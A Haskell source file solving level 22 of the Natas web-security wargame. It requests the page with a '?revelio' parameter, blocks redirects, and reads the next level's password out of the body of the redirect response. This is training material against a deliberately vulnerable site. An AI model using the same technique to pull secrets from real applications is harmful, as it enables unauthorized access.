module Natas.Natas22 where

import           Control.Exception   (try, throwIO)

import           Data.Text           (Text)
import           Data.Text.Encoding  (decodeUtf8)
import           Safe                (headMay, lastMay)

import           Network.HTTP.Client (HttpException (HttpExceptionRequest),
                                      HttpExceptionContent (StatusCodeException))
import           Network.Wreq        (redirects)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  let req = getLevel' 22 (parentUri 22 ++ "/?revelio") (redirects .~ 0)
  caughtBody <- handler (try (reqBody <$> req))
  attemptParse caughtBody

handler :: IO (Either HttpException Text) -> IO Text
handler = (=<<) $ \case
 Right body -> pure body
 Left (HttpExceptionRequest _ (StatusCodeException _ bs)) -> pure (decodeUtf8 bs)
 Left err -> throwIO err

attemptParse :: Text -> IO (Maybe Text)
attemptParse body =
  let match = headMay (workupBody' extractPassword body)
  in pure $ match >>= lastMay
